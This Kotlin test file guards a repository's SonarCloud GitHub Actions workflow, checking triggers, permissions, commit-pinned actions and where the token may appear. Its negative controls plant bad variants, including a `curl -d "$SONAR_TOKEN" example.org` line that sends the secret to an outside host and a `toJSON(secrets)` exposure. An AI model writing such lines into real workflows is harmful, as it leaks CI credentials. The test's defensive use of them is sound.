import java.io.File
import org.assertj.core.api.Assertions.assertThat
import org.assertj.core.api.Assertions.assertThatThrownBy
import org.junit.jupiter.api.Test
import org.yaml.snakeyaml.LoaderOptions
import org.yaml.snakeyaml.Yaml

/**
 * The nightly SonarCloud workflow stays reported only (ADR-0058): it never runs on a pull request or in the merge
 * queue (ADR-0047), the CI gate never calls it (ADR-0023), every action is pinned to a commit and the token reaches
 * only the steps that need it. The workflows are parsed as YAML (snakeyaml reaches the test classpath through
 * `generatorApi`); only the pin comments, which parsing drops, are read from the raw lines. A file that does not
 * parse, or repeats a key, fails the test. Each rule has a negative control: a planted variant of the real file.
 */
class SonarWorkflowGuardTest {

    private val workflows: File = generateSequence(File("").absoluteFile) { it.parentFile }
        .map { File(it, ".github/workflows") }
        .first { File(it, "ci.yml").isFile }

    private val sonar get() = File(workflows, "sonar.yml").readText()
    private val ci get() = File(workflows, "ci.yml").readText()
    private val service get() = File(workflows, "service.yml").readText()

    @Test
    fun sonarRunsOnTheScheduleAndOnDispatchOnly() {
        assertThat(Guard.triggers(sonar)).isEmpty()
        for (trigger in listOf("pull_request", "\"pull_request\"", "workflow_run")) {
            val planted = sonar.plant("  workflow_dispatch:\n", "  workflow_dispatch:\n  $trigger:\n")
            assertThat(Guard.triggers(planted)).`as`(trigger).isNotEmpty()
        }
    }

    @Test
    fun sonarIsOneJobOnTheCanonicalMainWithReadOnlyPermissions() {
        assertThat(Guard.job(sonar)).isEmpty()
        val permissions = "permissions:\n  contents: read\n"
        val planted = mapOf(
            "write-all" to sonar.plant(permissions, "permissions: write-all\n"),
            "no permissions" to sonar.plant(permissions, ""),
            "job write" to sonar.plant("    steps:\n", "    permissions:\n      contents: write\n    steps:\n"),
            "no if" to sonar.plant(Regex("(?m)^ {4}if: .*\n"), ""),
        )
        planted.forEach { (name, text) -> assertThat(Guard.job(text)).`as`(name).isNotEmpty() }
    }

    @Test
    fun theTokenReachesOnlyTheProbeTheScanAndTheGate() {
        assertThat(Guard.token(sonar)).isEmpty()
        val verify = "        run: ./gradlew verifyAll"
        val scan = "        uses: SonarSource/sonarqube-scan-action@22918119ff8e1ca75a623e15c8296b6ea4fbe28f # v8.2.1\n"
        val gateEnv = Regex("(?<=quality-gate-action@\\S{40} # v\\d\\S{0,20}\n)\\s+env:\n\\s+SONAR_TOKEN: .*\n")
        val planted = mapOf(
            "secret on Verify" to sonar.plant(verify, "        env:\n          T: \${{ secrets.sonar_token }}\n$verify"),
            "toJSON(secrets)" to sonar.plant(verify, "        env:\n          T: \${{ toJSON(secrets) }}\n$verify"),
            "scan as a run" to sonar.plant(scan, "        run: ./gradlew sonar\n"),
            "probe sends the token" to sonar.plant(
                "            echo \"enabled=true\" >> \"\$GITHUB_OUTPUT\"\n",
                "            echo \"enabled=true\" >> \"\$GITHUB_OUTPUT\"\n            curl -d \"\$SONAR_TOKEN\" example.org\n",
            ),
            "gate without env" to sonar.plant(gateEnv, ""),
        )
        planted.forEach { (name, text) -> assertThat(Guard.token(text)).`as`(name).isNotEmpty() }
    }

    @Test
    fun theRunSkipsGreenWithoutTheTokenAndNeverTurnsRed() {
        assertThat(Guard.neverRed(sonar)).isEmpty()
        val enabledFalse = "            echo \"enabled=false\" >> \"\$GITHUB_OUTPUT\"\n"
        val javaIf = "        id: java\n        if: steps.sonar_token.outputs.enabled == 'true'\n"
        val javaGate = "        if: steps.sonar_token.outputs.enabled == 'true'\n"
        val planted = mapOf(
            "exit in the probe" to sonar.plant(enabledFalse, "$enabledFalse            exit 1\n"),
            "unconditional enabled=true" to sonar.plant(
                "          if [ -n \"\$SONAR_TOKEN\" ]; then\n",
                "          echo \"enabled=true\" >> \"\$GITHUB_OUTPUT\"\n          if [ -n \"\$SONAR_TOKEN\" ]; then\n",
            ),
            "second job" to "$sonar\n  extra:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n",
            "always() or the token" to sonar.plant(javaIf, javaIf.replace("if: ", "if: always() || ")),
            "negated gate" to sonar.plant(javaIf, "        id: java\n        if: \"!(steps.sonar_token.outputs.enabled == 'true')\"\n"),
            "continue-on-error under with" to sonar
                .plant("        id: java\n$javaGate        continue-on-error: true\n", "        id: java\n$javaGate")
                .plant("        with:\n          distribution: temurin\n", "        with:\n          continue-on-error: true\n          distribution: temurin\n"),
            "always() alone" to sonar.plant(javaIf, "        id: java\n        if: always()\n"),
            "job not continue-on-error" to sonar.plant("    continue-on-error: true\n    steps:\n", "    steps:\n"),
        )
        planted.forEach { (name, text) -> assertThat(Guard.neverRed(text)).`as`(name).isNotEmpty() }
    }

    @Test
    fun everyActionIsPinnedToACommitWithItsVersion() {
        assertThat(Guard.uses(Guard.parse(sonar))).isNotEmpty()
        assertThat(Guard.pins(sonar)).isEmpty()
        for (bad in listOf(
            "uses: foo/bar@v1",
            "uses: foo/bar@0123456789abcdef0123456789abcdef01234567",
            "uses: foo/bar@main # v1",
            "uses: ./.github/actions/local",
        )) {
            val planted = sonar.plant("    steps:\n", "    steps:\n      - name: Planted\n        $bad\n")
            assertThat(Guard.pins(planted)).`as`(bad).isNotEmpty()
        }
    }

    @Test
    fun theCiGateNeverCallsOrWaitsForSonar() {
        assertThat(Guard.gateNeeds(ci)).isNotEmpty()
        assertThat(Guard.gate(ci)).isEmpty()
        assertThat(Guard.gate(service)).isEmpty()
        val calls = ci.plant("  gate:\n", "  sonar:\n    name: Sonar\n    uses: ./.github/workflows/sonar.yml\n\n  gate:\n")
        val waits = ci.plant("    needs: [changes, service, native, docs]\n", "    needs: [changes, service, native, docs, sonar]\n")
        assertThat(Guard.gate(calls)).`as`("calls").isNotEmpty()
        assertThat(Guard.gate(waits)).`as`("waits").isNotEmpty()
    }

    @Test
    fun aWorkflowThatDoesNotParseOrRepeatsAKeyFailsTheCheck() {
        assertThatThrownBy { Guard.parse("$sonar\n  : [") }.isNotNull()
        assertThatThrownBy { Guard.parse(sonar.plant("permissions:\n  contents: read\n", "permissions:\n  contents: read\npermissions:\n  contents: read\n")) }
            .isNotNull()
    }

    private fun String.plant(anchor: Regex, replacement: String): String {
        check(anchor.findAll(this).count() == 1) { "the plant anchor is gone or ambiguous, update the test: $anchor" }
        return anchor.replaceFirst(this, replacement)
    }

    private fun String.plant(anchor: String, replacement: String): String {
        check(split(anchor).size == 2) { "the plant anchor is gone or ambiguous, update the test: ${anchor.trim()}" }
        return replace(anchor, replacement)
    }
}

/** Rules over a parsed workflow; each returns its violations. The expressions are read by their top-level terms. */
private object Guard {

    private const val GATE = "steps.sonar_token.outputs.enabled=='true'"
    private val tokenSteps = setOf("sonar_token", "scan", "quality_gate")
    private val actions = mapOf("scan" to "SonarSource/sonarqube-scan-action@", "quality_gate" to "SonarSource/sonarqube-quality-gate-action@")
    private val pinnedLine = Regex("""^\s*(?:-\s+)?uses:\s*([^\s@#]+@[0-9a-f]{40})\s+#\s*v\d\S*\s*$""")

    /** Snakeyaml (YAML 1.1) reads the bare `on` key as boolean true. */
    fun parse(text: String): Map<*, *> {
        val doc = Yaml(LoaderOptions().apply { isAllowDuplicateKeys = false }).load<Any?>(text) as Map<*, *>
        val named = doc.entries.associate { (if (it.key == true) "on" else it.key) to it.value }
        check(named.size == doc.size) { "the workflow has both an on and a true key" }
        return named
    }

    private fun Any?.map(): Map<*, *> = this as? Map<*, *> ?: emptyMap<Any?, Any?>()
    private fun Any?.list(): List<*> = this as? List<*> ?: emptyList<Any?>()

    private fun jobs(doc: Map<*, *>) = doc["jobs"].map().entries.associate { it.key.toString() to it.value.map() }
    private fun steps(job: Map<*, *>) = job["steps"].list().map { it.map() }
    private fun stepsOf(doc: Map<*, *>) = jobs(doc).values.flatMap(::steps)
    private fun Map<*, *>.id() = this["id"]?.toString()

    /** The terms of an `if` joined by `&&`, or null when it has a top-level `||`; whitespace and `${{ }}` removed. */
    private fun terms(condition: Any?): List<String>? {
        val raw = condition?.toString()?.trim().orEmpty().removePrefix("\${{").removeSuffix("}}")
        val alternatives = split(raw, "||")
        return if (alternatives.size == 1) split(alternatives.single(), "&&") else null
    }

    private fun split(text: String, separator: String): List<String> {
        val parts = mutableListOf<String>()
        var depth = 0
        var quoted = false
        var start = 0
        var i = 0
        while (i < text.length) {
            when {
                text[i] == '\'' -> quoted = !quoted
                quoted -> {}
                text[i] in "([" -> depth++
                text[i] in ")]" -> depth--
                depth == 0 && text.startsWith(separator, i) -> {
                    parts += text.substring(start, i)
                    start = i + separator.length
                    i = start - 1
                }
            }
            i++
        }
        return (parts + text.substring(start)).map { it.filterNot(Char::isWhitespace) }
    }

    fun triggers(text: String): List<String> {
        val on = parse(text)["on"]
        val found = if (on is Map<*, *>) on.keys.map { it.toString() } else on.list().map { it.toString() } + listOfNotNull(on as? String)
        return found.filterNot { it in setOf("schedule", "workflow_dispatch") }.map { "unexpected trigger $it" } +
            listOf("schedule", "workflow_dispatch").filterNot { it in found }.map { "missing trigger $it" }
    }

    fun job(text: String): List<String> {
        val doc = parse(text)
        val jobs = jobs(doc)
        val job = jobs.values.singleOrNull() ?: return listOf("expected exactly one job, found ${jobs.size}")
        val condition = terms(job["if"])
        return listOfNotNull(
            if (doc["permissions"] != mapOf("contents" to "read")) "top-level permissions are not exactly contents: read" else null,
            if ("permissions" in job) "the job overrides the permissions" else null,
            if (condition == null || "github.repository=='spec-kitty/spec-kitty-charter'" !in condition ||
                "github.ref=='refs/heads/main'" !in condition) "the job does not require the canonical repository's main" else null,
        )
    }

    fun token(text: String): List<String> {
        val doc = parse(text)
        val violations = mutableListOf<String>()
        val allowed = mutableSetOf<String>()
        val probeRun = mutableSetOf<String>()
        jobs(doc).forEach { (name, job) ->
            steps(job).forEachIndexed { index, step ->
                val at = "/jobs/$name/steps/$index"
                if (step.id() == "sonar_token") {
                    probeRun += "$at/run"
                    violations += probeScript(step["run"]?.toString().orEmpty())
                }
                if (step.id() in tokenSteps) allowed += "$at/env/SONAR_TOKEN"
                actions[step.id()]?.let { action ->
                    if (step["run"] != null || step["uses"]?.toString()?.startsWith(action) != true) violations += "${step.id()} is not a use of $action"
                }
            }
        }
        val seen = mutableListOf<String>()
        scalars(doc, "") { path, text ->
            seen += path
            when {
                path in allowed -> if (text != "SONAR_TOKEN" && text.filterNot(Char::isWhitespace) != "\${{secrets.SONAR_TOKEN}}")
                    violations += "$path is not the token: $text"
                path in probeRun -> {}
                Regex("""(?i)\bsecrets\b""").containsMatchIn(text) -> violations += "secrets at $path"
                Regex("""(?i)\bsonar_token\b""").containsMatchIn(text.replace(Regex("""(?i)steps\.sonar_token"""), "")) &&
                    !(path.endsWith("/id") && text == "sonar_token") -> violations += "the token at $path"
            }
        }
        violations += allowed.filterNot { it in seen }.map { "$it is missing" }
        return violations
    }

    /** The probe names the token only to test it for emptiness or inside an echoed message. */
    private fun probeScript(script: String): List<String> =
        script.lines().filter { Regex("""(?i)sonar_token""").containsMatchIn(it) }.mapNotNull { line ->
            val test = Regex("""^\s*if \[ -[nz] "[$]SONAR_TOKEN" ]; then\s*$""").matches(line)
            val notice = line.trimStart().startsWith("echo ") && !Regex("""[$]\{?SONAR_TOKEN""").containsMatchIn(line)
            if (test || notice) null else "the probe uses the token: ${line.trim()}"
        }

    private fun scalars(node: Any?, path: String, visit: (String, String) -> Unit) {
        when (node) {
            is Map<*, *> -> node.forEach { (key, value) ->
                visit("$path/$key", key.toString())
                scalars(value, "$path/$key", visit)
            }
            is List<*> -> node.forEachIndexed { index, item -> scalars(item, "$path/$index", visit) }
            null -> {}
            else -> visit(path, node.toString())
        }
    }

    fun neverRed(text: String): List<String> {
        val doc = parse(text)
        val jobs = jobs(doc)
        val job = jobs.values.singleOrNull() ?: return listOf("expected exactly one job, found ${jobs.size}")
        val steps = steps(job)
        val probe = steps.firstOrNull()?.takeIf { it.id() == "sonar_token" } ?: return listOf("the probe is not the first step")
        val script = probe["run"]?.toString().orEmpty()
        val violations = mutableListOf<String>()
        if (job["continue-on-error"] != true) violations += "the job is not continue-on-error"
        if (Regex("""\bexit\b""").containsMatchIn(script)) violations += "the probe exits"
        var branch = "outside"
        for (line in script.lines().map(String::trim)) {
            when {
                line.startsWith("if ") -> branch = "then"
                line == "else" -> branch = "else"
                line == "fi" -> branch = "outside"
            }
            if ("enabled=true" in line && branch != "then") violations += "the probe enables outside the token branch"
            if ("enabled=false" in line && branch != "else") violations += "the probe disables outside the else branch"
        }
        if ("enabled=false" !in script) violations += "the probe never writes enabled=false"
        steps.drop(1).forEach { step ->
            val name = step["name"] ?: step.id()
            if (step["continue-on-error"] != true) violations += "$name is not continue-on-error"
            if (GATE !in terms(step["if"]).orEmpty()) violations += "$name is not gated on the token probe"
        }
        return violations
    }

    /** Every `uses:` of the workflow, steps and reusable-workflow jobs alike. */
    fun uses(doc: Map<*, *>): List<String> =
        jobs(doc).values.flatMap { job -> listOfNotNull(job["uses"]) + steps(job).mapNotNull { it["uses"] } }.map { it.toString() }

    /** The version comments are dropped by parsing, so the pins are read from the raw lines. */
    fun pins(text: String): List<String> {
        val pinned = text.lines().mapNotNull { pinnedLine.matchEntire(it)?.groupValues?.get(1) }.toSet()
        return uses(parse(text)).filterNot { it in pinned }.map { "not pinned to a commit with a # vX comment: $it" }
    }

    fun gateNeeds(text: String): List<*> = jobs(parse(text))["gate"]?.get("needs").list()

    /** No job or step of a gate workflow calls or waits for sonar; the path filters may name it. */
    fun gate(text: String): List<String> {
        val doc = parse(text)
        return jobs(doc).flatMap { (name, job) ->
            val needs = job["needs"].let { it.list().ifEmpty { listOfNotNull(it) } }
            (listOfNotNull(job["uses"]) + steps(job).mapNotNull { it["uses"] } + needs)
                .filter { it.toString().contains("sonar", ignoreCase = true) }
                .map { "$name calls or waits for $it" }
        }
    }
}
